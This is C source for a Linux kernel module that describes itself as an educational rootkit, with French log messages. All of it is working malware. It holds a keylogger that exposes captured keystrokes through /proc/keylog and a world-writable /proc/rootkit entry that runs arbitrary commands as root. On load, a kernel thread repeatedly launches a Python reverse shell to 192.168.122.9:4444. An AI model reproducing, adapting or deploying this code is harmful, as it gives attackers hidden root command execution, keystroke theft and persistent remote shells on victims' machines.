#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/string.h>
#include <linux/input-event-codes.h>
#include <linux/mutex.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/delay.h>

#define BUFFER_SIZE 256
#define BUF_SIZE 1024

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Shayman");
MODULE_DESCRIPTION("Rootkit pédagogique");
MODULE_VERSION("0.1");

#define PROC_NAME_ROOTKIT "rootkit"
#define PROC_NAME_SECRET "secret"
#define PROC_NAME_KEYLOG "keylog"

static void exec_user_cmd(const char *cmd);
static void reverse_shell(void);
static void start_keylogger(void);
static void stop_keylogger(void);
static ssize_t proc_secret_write(struct file *file, const char __user *buf, size_t count, loff_t *pos);
static ssize_t proc_rootkit_read(struct file *file, char __user *ubuf, size_t len, loff_t *off);
static ssize_t proc_rootkit_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos);
static ssize_t keylog_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);

static char proc_buf[BUF_SIZE];
static int proc_buf_pos = 0;
static DEFINE_MUTEX(proc_buf_mutex);

static struct proc_dir_entry *proc_entry_rootkit;
static struct proc_dir_entry *proc_entry_secret;
static struct proc_dir_entry *keylog_entry;
static struct task_struct *rs_thread;

static bool shift_pressed = false;
static bool keylogger_running = false;

 //----------------------------//
//        CMD EXECUTION       //
//----------------------------//

static void exec_user_cmd(const char *cmd)
{
    char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=xterm",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        NULL
    };

    printk(KERN_INFO "[rootkit] Exécution de la commande : %s\n", cmd);
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    printk(KERN_INFO "[rootkit] Code retour : %d\n", ret);
}


//----------------------------------//
//         Reverse Shell            //
//----------------------------------//


static int reverse_shell_fn(void *data)
{
    while (!kthread_should_stop()) {
        const char *cmd = "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.122.9\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'";
        exec_user_cmd(cmd);
        ssleep(5);
    }
    return 0;
}

static void reverse_shell(void)
{
    if (!rs_thread || IS_ERR(rs_thread)) {
        rs_thread = kthread_run(reverse_shell_fn, NULL, "reverse_shell_thread");
        if (IS_ERR(rs_thread)) {
            printk(KERN_ERR "[rootkit] Impossible de démarrer le thread de reverse shell\n");
        } else {
            printk(KERN_INFO "[rootkit] Thread de reverse shell démarré\n");
        }
    }
}

//----------------------------//
//        Keymap Tables       //
//----------------------------//

static const char keymap[256] = {
    [KEY_1] = '1', [KEY_2] = '2', [KEY_3] = '3', [KEY_4] = '4', [KEY_5] = '5',
    [KEY_6] = '6', [KEY_7] = '7', [KEY_8] = '8', [KEY_9] = '9', [KEY_0] = '0',
    [KEY_Q] = 'q', [KEY_W] = 'w', [KEY_E] = 'e', [KEY_R] = 'r', [KEY_T] = 't',
    [KEY_Y] = 'y', [KEY_U] = 'u', [KEY_I] = 'i', [KEY_O] = 'o', [KEY_P] = 'p',
    [KEY_A] = 'a', [KEY_S] = 's', [KEY_D] = 'd', [KEY_F] = 'f', [KEY_G] = 'g',
    [KEY_H] = 'h', [KEY_J] = 'j', [KEY_K] = 'k', [KEY_L] = 'l',
    [KEY_Z] = 'z', [KEY_X] = 'x', [KEY_C] = 'c', [KEY_V] = 'v', [KEY_B] = 'b',
    [KEY_N] = 'n', [KEY_M] = 'm',
    [KEY_SPACE] = ' ', [KEY_MINUS] = '-', [KEY_EQUAL] = '=',
    [KEY_COMMA] = ',', [KEY_DOT] = '.', [KEY_SLASH] = '/',
    [KEY_SEMICOLON] = ';', [KEY_APOSTROPHE] = '\'', [KEY_LEFTBRACE] = '[',
    [KEY_RIGHTBRACE] = ']', [KEY_BACKSLASH] = '\\', [KEY_GRAVE] = '`',
};

static const char keymap_shift[256] = {
    [KEY_1] = '!', [KEY_2] = '@', [KEY_3] = '#', [KEY_4] = '$', [KEY_5] = '%',
    [KEY_6] = '^', [KEY_7] = '&', [KEY_8] = '*', [KEY_9] = '(', [KEY_0] = ')',
    [KEY_Q] = 'Q', [KEY_W] = 'W', [KEY_E] = 'E', [KEY_R] = 'R', [KEY_T] = 'T',
    [KEY_Y] = 'Y', [KEY_U] = 'U', [KEY_I] = 'I', [KEY_O] = 'O', [KEY_P] = 'P',
    [KEY_A] = 'A', [KEY_S] = 'S', [KEY_D] = 'D', [KEY_F] = 'F', [KEY_G] = 'G',
    [KEY_H] = 'H', [KEY_J] = 'J', [KEY_K] = 'K', [KEY_L] = 'L',
    [KEY_Z] = 'Z', [KEY_X] = 'X', [KEY_C] = 'C', [KEY_V] = 'V', [KEY_B] = 'B',
    [KEY_N] = 'N', [KEY_M] = 'M',
    [KEY_SPACE] = ' ', [KEY_MINUS] = '_', [KEY_EQUAL] = '+',
    [KEY_COMMA] = '<', [KEY_DOT] = '>', [KEY_SLASH] = '?',
    [KEY_SEMICOLON] = ':', [KEY_APOSTROPHE] = '"', [KEY_LEFTBRACE] = '{',
    [KEY_RIGHTBRACE] = '}', [KEY_BACKSLASH] = '|', [KEY_GRAVE] = '~',
};

//----------------------------//
//      Keylogger handling    //
//----------------------------//

static void handle_key(char c)
{
    mutex_lock(&proc_buf_mutex);

    if (c == '\b') {
        if (proc_buf_pos > 0) {
            proc_buf_pos--;
            proc_buf[proc_buf_pos] = '\0';
        }
    } else if (c == '\n' || c == ' ') {
        if (proc_buf_pos < BUF_SIZE - 1) {
            proc_buf[proc_buf_pos++] = c;
            proc_buf[proc_buf_pos] = '\0';
        }
    } else if (c >= 32 && c <= 126) {
        if (proc_buf_pos < BUF_SIZE - 1) {
            proc_buf[proc_buf_pos++] = c;
            proc_buf[proc_buf_pos] = '\0';
        } else {
            memmove(proc_buf, proc_buf + 1, BUF_SIZE - 2);
            proc_buf[BUF_SIZE - 2] = c;
            proc_buf[BUF_SIZE - 1] = '\0';
        }
    }

    mutex_unlock(&proc_buf_mutex);
}

static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE) {
        if (param->down) {
            // shift
            if (param->value == KEY_LEFTSHIFT || param->value == KEY_RIGHTSHIFT) {
                shift_pressed = true;
                return NOTIFY_OK;
            }

            // conversion touche en caractère
            if (param->value < 256) {
                char c = shift_pressed ? keymap_shift[param->value] : keymap[param->value];
                if (c) {
                    handle_key(c);
                }
            }
        } else {
            if (param->value == KEY_LEFTSHIFT || param->value == KEY_RIGHTSHIFT) {
                shift_pressed = false;
                return NOTIFY_OK;
            }
        }
        return NOTIFY_OK;
    }
    
    return NOTIFY_DONE; 
}


static struct notifier_block nb = {
    .notifier_call = keylogger_cb,
};

static ssize_t keylog_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
    ssize_t ret;

    mutex_lock(&proc_buf_mutex);

    ret = simple_read_from_buffer(buf, count, ppos, proc_buf, proc_buf_pos);

    mutex_unlock(&proc_buf_mutex);

    return ret;
}

static const struct proc_ops keylog_fops = {
    .proc_read = keylog_read,
};

static ssize_t proc_secret_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)
{
    char kbuf[BUFFER_SIZE] = {0};
    if (count > BUFFER_SIZE - 1)
        return -EINVAL;

    if (copy_from_user(kbuf, buf, count))
        return -EFAULT;

    kbuf[count] = '\0';

    if (count > 0 && kbuf[count - 1] == '\n') {
        kbuf[count - 1] = '\0';
    }

    printk(KERN_INFO "[rootkit] Message reçu sur secret : %s\n", kbuf);

    if (strcmp(kbuf, "reverse_shell") == 0) {
        reverse_shell();
    } else if (strcmp(kbuf, "start_keylogger") == 0) {
        start_keylogger();
    } else if (strcmp(kbuf, "stop_keylogger") == 0) {
        stop_keylogger();
    } else {
        printk(KERN_INFO "[rootkit] Commande inconnue\n");
    }

    return count;
}


static ssize_t proc_rootkit_read(struct file *file, char __user *ubuf, size_t len, loff_t *off)
{
    const char *msg = "rootkit active\n";
    return simple_read_from_buffer(ubuf, len, off, msg, strlen(msg));
}

static ssize_t proc_rootkit_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos)
{
    char kbuf[BUFFER_SIZE] = {0};
    if (count > BUFFER_SIZE - 1)
        return -EINVAL;

    if (copy_from_user(kbuf, buffer, count))
        return -EFAULT;

    kbuf[count] = '\0';

    printk(KERN_INFO "[rootkit] Commande reçue : %s\n", kbuf);

    exec_user_cmd(kbuf);

    return count;
}

static const struct proc_ops proc_rootkit_fops = {
    .proc_read = proc_rootkit_read,
    .proc_write = proc_rootkit_write,
};

static const struct proc_ops proc_secret_fops = {
    .proc_write = proc_secret_write,
};

//----------------------------//
//      Keylogger control     //
//----------------------------//

static void start_keylogger(void)
{
    int ret;

    if (keylogger_running) {
        printk(KERN_INFO "[rootkit] Keylogger déjà démarré\n");
        return;
    }

    ret = register_keyboard_notifier(&nb);
    if (ret) {
        printk(KERN_INFO "[rootkit] Impossible de démarrer le keylogger (%d)\n", ret);
    } else {
        keylogger_running = true;
        printk(KERN_INFO "[rootkit] Keylogger démarré\n");
    }
}

static void stop_keylogger(void)
{
    if (!keylogger_running) {
        printk(KERN_INFO "[rootkit] Keylogger non actif\n");
        return;
    }
    unregister_keyboard_notifier(&nb);
    keylogger_running = false;
    printk(KERN_INFO "[rootkit] Keylogger arrêté\n");
}


//----------------------------//
//        Init / Exit         //
//----------------------------//

static int __init rootkit_init(void)
{
    printk(KERN_INFO "[rootkit] Chargement du module rootkit\n");

    proc_entry_rootkit = proc_create(PROC_NAME_ROOTKIT, 0666, NULL, &proc_rootkit_fops);
    if (!proc_entry_rootkit) {
        printk(KERN_ERR "[rootkit] Erreur création /proc/%s\n", PROC_NAME_ROOTKIT);
        return -ENOMEM;
    }

    proc_entry_secret = proc_create(PROC_NAME_SECRET, 0222, NULL, &proc_secret_fops);
    if (!proc_entry_secret) {
        printk(KERN_ERR "[rootkit] Erreur création /proc/%s\n", PROC_NAME_SECRET);
        proc_remove(proc_entry_rootkit);
        return -ENOMEM;
    }

    keylog_entry = proc_create(PROC_NAME_KEYLOG, 0444, NULL, &keylog_fops);
    if (!keylog_entry) {
        printk(KERN_ERR "[rootkit] Erreur création /proc/%s\n", PROC_NAME_KEYLOG);
        proc_remove(proc_entry_rootkit);
        proc_remove(proc_entry_secret);
        return -ENOMEM;
    }

    mutex_init(&proc_buf_mutex);
    proc_buf_pos = 0;
    memset(proc_buf, 0, BUF_SIZE);

    rs_thread = kthread_run(reverse_shell_fn, NULL, "rs_thread");
    if (IS_ERR(rs_thread)) {
        printk(KERN_ERR "[rootkit] Erreur lancement thread reverse shell\n");
        proc_remove(proc_entry_rootkit);
        proc_remove(proc_entry_secret);
        proc_remove(keylog_entry);
        return PTR_ERR(rs_thread);
    }

    printk(KERN_INFO "[rootkit] Module chargé avec succès\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    stop_keylogger();

    if (rs_thread) {
        kthread_stop(rs_thread);
        printk(KERN_INFO "[rootkit] Thread reverse shell arrêté.\n");
    }

    if (proc_entry_rootkit)
        proc_remove(proc_entry_rootkit);
    if (proc_entry_secret)
        proc_remove(proc_entry_secret);
    if (keylog_entry)
        proc_remove(keylog_entry);

    printk(KERN_INFO "[rootkit] Module déchargé\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
